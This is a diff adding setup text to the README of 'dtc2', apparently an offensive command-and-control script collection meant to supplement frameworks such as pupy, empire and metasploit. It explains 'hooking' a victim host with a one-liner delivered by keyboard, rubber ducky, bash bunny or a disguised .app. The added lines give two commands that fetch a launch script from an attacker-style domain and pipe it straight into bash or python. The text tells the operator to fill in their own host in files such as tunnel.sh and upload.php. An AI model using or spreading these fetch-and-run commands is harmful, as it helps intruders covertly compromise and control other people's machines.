@@ -1,5 +1,12 @@
 # dtc2
 Duct Tape Command and Control!
+This is just a compilation of scripts to help dig in a little bit and move around. It's designed to be used with tools like pupy, empire and metasploit, by adding functionality that those toolsets don't currently have, or is not easy to run in certain circumstances. It's designed to 'hook' a host by running a one-liner, so it can be deployed quickly from a keyboard, a ducky, a bash bunny, a platypus .app, or really any other way you want to run it. The easy way is like so:
+> curl -s https://haxsite.lol/launch.sh | bash 
+
+or, if you've used the packer:
+
+> curl -s https://haxsite.lol/launch.sh.py | python
+
 
 ## WARNING
 You will ABSOLUTELY NEED to go into these files and edit them: cups.sh, launch.sh, tunnel.sh, upload.php, snapshot.sh. There are placeholders for where you need to put the domain or ip or host you intend to host some of these things on, and some small tweaks, but nothing that won't take you ~3 minutes.
